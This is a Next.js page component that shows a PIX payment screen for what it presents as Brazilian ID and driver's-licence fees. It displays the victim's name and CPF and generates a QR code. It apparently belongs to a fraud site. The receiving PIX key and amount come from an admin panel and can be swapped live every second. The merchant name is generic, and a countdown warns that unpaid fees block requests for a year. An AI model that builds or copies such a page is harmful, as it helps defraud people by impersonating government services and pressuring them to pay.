"use client";
import { useEffect, useState, Suspense } from "react";
import { useSearchParams } from "next/navigation";
import { QRCodeSVG } from "qrcode.react";

/**
 * Calcula o CRC16 (Cyclic Redundancy Check) para a string do PIX
 * @param str String para calcular o CRC
 * @returns String hexadecimal do CRC16
 */
function calcCRC16(str: string): string {
  // Polinômio para cálculo do CRC16: 0x1021 (padrão CCITT)
  const polynomial = 0x1021;
  let crc = 0xFFFF;

  // Converter string para array de bytes
  const bytes = [];
  for (let i = 0; i < str.length; i++) {
    bytes.push(str.charCodeAt(i));
  }

  // Calcular CRC16
  for (let i = 0; i < bytes.length; i++) {
    crc ^= bytes[i] << 8;
    for (let j = 0; j < 8; j++) {
      if (crc & 0x8000) {
        crc = (crc << 1) ^ polynomial;
      } else {
        crc = crc << 1;
      }
    }
  }

  // Aplicar máscara e converter para hexadecimal
  crc &= 0xFFFF;
  return crc.toString(16).toUpperCase().padStart(4, '0');
}

/**
 * Gera o código PIX (BRCode) para pagamentos
 * @param params Parâmetros para geração do código PIX
 * @returns String do código PIX para cópia e colagem ou QR Code
 */
function gerarCodigoPix(params: {
  chave: string;
  nome: string;
  cidade: string;
  valor: number;
  txid?: string;
  descricao?: string;
}): string {
  const { chave, nome, cidade, valor, txid = '***', descricao = '' } = params;
  
  // Formatar valor com 2 casas decimais e COM ponto (padrão BRCode)
  const valorFormatado = valor.toFixed(2);
  
  // Limitar tamanho dos campos conforme especificação
  const nomeFormatado = nome.normalize('NFD').replace(/[\u0300-\u036f]/g, '').slice(0, 25);
  const cidadeFormatada = cidade.normalize('NFD').replace(/[\u0300-\u036f]/g, '').slice(0, 15);
  const descricaoFormatada = descricao.slice(0, 50);
  
  // Montar os campos do código PIX
  const camposPix = [
    { id: '00', valor: '01' },                                      // Payload Format Indicator
    { id: '01', valor: '11' },                                      // Point of Initiation Method (11 = QR estático)
    { 
      id: '26', 
      valor: [                                                      // Merchant Account Information
        { id: '00', valor: 'BR.GOV.BCB.PIX' },                      // GUI do PIX
        { id: '01', valor: chave }                                  // Chave PIX
      ].map(subcampo => `${subcampo.id}${subcampo.valor.length.toString().padStart(2, '0')}${subcampo.valor}`).join('')
    },
    { id: '52', valor: '0000' },                                    // Merchant Category Code (0000 = informação genérica)
    { id: '53', valor: '986' },                                     // Transaction Currency (986 = BRL)
    { id: '54', valor: valorFormatado },                            // Transaction Amount
    { id: '58', valor: 'BR' },                                      // Country Code
    { id: '59', valor: nomeFormatado },                             // Merchant Name
    { id: '60', valor: cidadeFormatada },                           // Merchant City
    { id: '62', valor: [                                            // Additional Data Field
      { id: '05', valor: txid }                                     // Reference Label (TxId)
    ].map(subcampo => `${subcampo.id}${subcampo.valor.length.toString().padStart(2, '0')}${subcampo.valor}`).join('') }
  ];

  // Se houver descrição, adicionar ao campo 62 (Additional Data Field)
  if (descricaoFormatada) {
    const campo62 = camposPix.find(campo => campo.id === '62');
    if (campo62) {
      campo62.valor = [
        { id: '05', valor: txid },                                  // Reference Label (TxId)
        { id: '08', valor: descricaoFormatada }                     // Purpose of Transaction (descrição)
      ].map(subcampo => `${subcampo.id}${subcampo.valor.length.toString().padStart(2, '0')}${subcampo.valor}`).join('');
    }
  }

  // Montar a string do código PIX
  let codigoPix = camposPix.map(campo => {
    return `${campo.id}${campo.valor.length.toString().padStart(2, '0')}${campo.valor}`; // CORREÇÃO AQUI
  }).join('');

  // Adicionar campo do CRC (sempre por último)
  codigoPix += '6304';
  
  // Calcular e adicionar o valor do CRC
  const crc = calcCRC16(codigoPix);
  codigoPix += crc;

  return codigoPix;
}

function PagamentoContent() {
  const searchParams = useSearchParams();
  const [loading, setLoading] = useState(true);
  const [chavePix, setChavePix] = useState("");
  const [valor, setValor] = useState(0);
  const [pixCopiaCola, setPixCopiaCola] = useState("");
  const [copied, setCopied] = useState(false);
  const [tempoRestante, setTempoRestante] = useState(1800); // 30 minutos em segundos

  // Extrair dados dos parâmetros da URL
  const dadosCliente = {
    nome: searchParams.get('nome') || '',
    cpf: searchParams.get('cpf') || '',
    servico: searchParams.get('servico') || 'RG - Primeira via',
    valor: searchParams.get('valor') || '178,35'
  };

  // Timer para tempo restante
  useEffect(() => {
    const timer = setInterval(() => {
      setTempoRestante(prev => {
        if (prev <= 1) {
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  const formatarTempo = (segundos: number) => {
    const minutos = Math.floor(segundos / 60);
    const segs = segundos % 60;
    return `${minutos.toString().padStart(2, '0')}:${segs.toString().padStart(2, '0')}`;
  };
  
  useEffect(() => {
    let lastUpdateTime = 0;
    let consecutiveErrors = 0;
    
    // Função para buscar dados PIX com retry automático
    const buscarDadosPix = async () => {
      try {
        // Adicionar múltiplos parâmetros para garantir unicidade absoluta
        const timestamp = Date.now();
        const random = Math.random().toString(36).substring(7);
        const nonce = Math.floor(Math.random() * 1000000);
        
        const response = await fetch(`/api/pix?t=${timestamp}&r=${random}&n=${nonce}&bust=${Date.now()}`, {
          cache: 'no-store',
          method: 'GET',
          headers: {
            'Cache-Control': 'no-cache, no-store, must-revalidate, max-age=0',
            'Pragma': 'no-cache',
            'Expires': '0',
            'X-Requested-With': 'XMLHttpRequest',
            'X-Cache-Bust': timestamp.toString()
          }
        });
        
        const contentType = response.headers.get("content-type");
        if (response.ok && contentType && contentType.includes("application/json")) {
          const data = await response.json();
          consecutiveErrors = 0; // Reset error counter
          
          // Verificar se a configuração existe
          if (!data.configured) {
            console.log("⚠️ PIX não configurado no admin");
            setLoading(false);
            return;
          }
          
          // Verificar se houve mudança real nos dados
          const currentUpdateTime = new Date(data.lastUpdate || data.timestamp).getTime();
          
          if (currentUpdateTime > lastUpdateTime || lastUpdateTime === 0) {
            lastUpdateTime = currentUpdateTime;
            
            setChavePix(data.key || "");
            
            // Usar o valor do painel admin se disponível, ou usar valor padrão
            const valorPix = data.value !== null ? data.value : parseFloat(dadosCliente.valor.replace(',', '.'));
            setValor(valorPix);
            
            console.log("🔄 DADOS PIX ATUALIZADOS INSTANTANEAMENTE:", { 
              chave: data.key, 
              valor: valorPix, 
              timestamp: data.timestamp,
              lastUpdate: data.lastUpdate,
              updateTime: new Date(currentUpdateTime).toLocaleTimeString()
            });
            
            // Montar código PIX usando a nova função que segue o padrão do Banco Central
            const pix = gerarCodigoPix({
              chave: data.key || "00000000000",
              nome: "Servico CNH", 
              cidade: "SAO PAULO",
              valor: valorPix,
              txid: "CNHSRV" + new Date().getTime().toString().slice(-8),
              descricao: "Pagamento Servico CNH"
            });
            
            setPixCopiaCola(pix);
            console.log("✅ QR CODE PIX REGENERADO INSTANTANEAMENTE!");
          } else {
            console.log("⏸️ Dados PIX inalterados");
          }
        }
      } catch (err) {
        consecutiveErrors++;
        console.error(`❌ Erro ao buscar PIX (tentativa ${consecutiveErrors}):`, err);
        
        // Se muitos erros consecutivos, aumentar intervalo temporariamente
        if (consecutiveErrors > 5) {
          console.log("⚠️ Muitos erros, reduzindo frequência temporariamente");
        }
      } finally {
        setLoading(false);
      }
    };

    // Buscar dados inicialmente
    buscarDadosPix();

    // Configurar polling ultra agressivo - a cada 1 segundo inicialmente
    let interval = setInterval(buscarDadosPix, 1000);

    // Após 30 segundos, reduzir para 2 segundos para economizar recursos
    const timeoutId = setTimeout(() => {
      clearInterval(interval);
      interval = setInterval(buscarDadosPix, 2000);
      console.log("🔄 Polling ajustado para 2 segundos");
    }, 30000);

    // Cleanup
    return () => {
      clearInterval(interval);
      clearTimeout(timeoutId);
    };
  }, [dadosCliente.valor]);

  return (
    <section className="py-8 min-h-[80vh] flex items-center justify-center bg-[#f7fbfb]">
      <div className="w-full max-w-lg bg-white rounded-lg shadow-lg overflow-hidden">
        {/* Header */}
        <div className="bg-[#0550ae] text-white p-4">
          <h1 className="text-xl font-bold text-center">Pagamento via PIX</h1>
        </div>

        <div className="p-6">
          {/* Dados do cliente */}
          <div className="mb-6">
            <h2 className="text-lg font-bold text-[#092046] mb-3">Guia de pagamento</h2>
            <div className="bg-[#f7fbfb] rounded p-4 space-y-2">
              <div className="flex justify-between">
                <span className="font-medium text-[#092046]">Nome:</span>
                <span className="text-[#919db1]">{dadosCliente.nome}</span>
              </div>
              <div className="flex justify-between">
                <span className="font-medium text-[#092046]">CPF:</span>
                <span className="text-[#919db1]">{dadosCliente.cpf}</span>
              </div>
              <div className="flex justify-between">
                <span className="font-medium text-[#092046]">Serviço:</span>
                <span className="text-[#919db1]">{dadosCliente.servico}</span>
              </div>
              <div className="flex justify-between">
                <span className="font-medium text-[#092046]">Valor:</span>
                <span className="text-[#919db1]">R$ {dadosCliente.valor}</span>
              </div>
            </div>
          </div>

          {/* Código PIX Copia e Cola */}
          <div className="mb-6">
            <h3 className="font-bold text-[#092046] mb-2">Código PIX Copia e Cola</h3>
            <div className="bg-gray-50 p-3 rounded border">
              <p className="text-xs text-[#092046] break-all mb-2">{pixCopiaCola}</p>
              <button 
                onClick={() => {
                  navigator.clipboard.writeText(pixCopiaCola);
                  setCopied(true);
                  setTimeout(() => setCopied(false), 1700);
                }} 
                className="w-full px-4 py-2 rounded bg-[#0550ae] hover:bg-[#092046] text-white font-semibold transition"
              >
                {copied ? "Copiado!" : "Copiar PIX"}
              </button>
            </div>
          </div>

          {/* Tempo restante */}
          <div className="mb-6 bg-yellow-50 border border-yellow-200 rounded p-3">
            <p className="text-sm text-[#919db1]">
              <strong>Atenção:</strong> O não pagamento da guia impedirá novas solicitações por 1 ano.
            </p>
            <p className="text-sm text-[#919db1] mt-1">
              Tempo restante para pagamento: <strong>{formatarTempo(tempoRestante)}</strong>
            </p>
          </div>

          {/* QR Code */}
          {loading ? (
            <div className="flex justify-center my-8">
              <div className="animate-pulse h-6 w-6 rounded-full bg-[#0550ae]" />
            </div>
          ) : (
            <div className="flex flex-col items-center mb-6">
              <div className="bg-white p-4 rounded shadow border">
                <QRCodeSVG value={pixCopiaCola} size={160} renderAs="svg" includeMargin={true} />
              </div>
            </div>
          )}

          {/* Como pagar com PIX */}
          <div className="mb-6">
            <h3 className="font-bold text-[#092046] mb-3">Como pagar com PIX:</h3>
            <div className="space-y-2">
              <div className="flex items-start">
                <span className="bg-[#0550ae] text-white rounded-full w-6 h-6 flex items-center justify-center text-sm font-bold mr-3 mt-0.5">1</span>
                <span className="text-sm text-[#919db1]">Abra o app do seu banco</span>
              </div>
              <div className="flex items-start">
                <span className="bg-[#0550ae] text-white rounded-full w-6 h-6 flex items-center justify-center text-sm font-bold mr-3 mt-0.5">2</span>
                <span className="text-sm text-[#919db1]">Escolha a opção PIX</span>
              </div>
              <div className="flex items-start">
                <span className="bg-[#0550ae] text-white rounded-full w-6 h-6 flex items-center justify-center text-sm font-bold mr-3 mt-0.5">3</span>
                <span className="text-sm text-[#919db1]">Escaneie o QR Code ou cole o código</span>
              </div>
              <div className="flex items-start">
                <span className="bg-[#0550ae] text-white rounded-full w-6 h-6 flex items-center justify-center text-sm font-bold mr-3 mt-0.5">4</span>
                <span className="text-sm text-[#919db1]">Confirme as informações e valor</span>
              </div>
              <div className="flex items-start">
                <span className="bg-[#0550ae] text-white rounded-full w-6 h-6 flex items-center justify-center text-sm font-bold mr-3 mt-0.5">5</span>
                <span className="text-sm text-[#919db1]">Finalize o pagamento</span>
              </div>
            </div>
          </div>

          {/* Botão Voltar */}
          <div className="text-center">
            <button 
              onClick={() => window.history.back()}
              className="bg-[#6c757d] hover:bg-[#5a6268] text-white px-6 py-2 rounded font-semibold transition"
            >
              Voltar
            </button>
          </div>
        </div>
      </div>
    </section>
  );
}

export default function Pagamento() {
  return (
    <Suspense fallback={<div>Carregando...</div>}>
      <PagamentoContent />
    </Suspense>
  );
}

